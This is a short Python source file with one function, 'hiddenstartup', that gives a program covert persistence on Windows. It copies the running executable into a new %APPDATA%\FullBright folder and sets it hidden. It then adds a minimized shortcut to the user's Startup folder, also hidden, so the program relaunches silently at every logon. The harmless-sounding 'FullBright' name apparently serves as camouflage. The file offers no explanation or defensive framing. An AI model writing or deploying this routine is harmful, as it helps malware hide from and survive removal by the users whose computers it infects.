import os, sys, shutil, ctypes, pythoncom
from pathlib import Path
from win32com.client import Dispatch
def hiddenstartup():
    pythoncom.CoInitialize()
    appdata = os.getenv('APPDATA')
    target_folder = Path(appdata) / 'FullBright'
    target_folder.mkdir(parents=True, exist_ok=True)
    target_exe = target_folder / Path(sys.executable).name
    if target_exe.exists(): target_exe.unlink()
    shutil.copy(sys.executable, target_folder)
    ctypes.windll.kernel32.SetFileAttributesW(str(target_exe), 0x2)
    startup = Path(appdata) / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'
    shortcut = startup / 'FullBright.lnk'
    shell = Dispatch('WScript.Shell')
    shortcut_obj = shell.CreateShortcut(str(shortcut))
    shortcut_obj.TargetPath = str(target_exe)
    shortcut_obj.IconLocation = str(target_exe)
    shortcut_obj.WindowStyle = 7
    shortcut_obj.Save()
    ctypes.windll.kernel32.SetFileAttributesW(str(shortcut), 0x2)
    pythoncom.CoUninitialize()
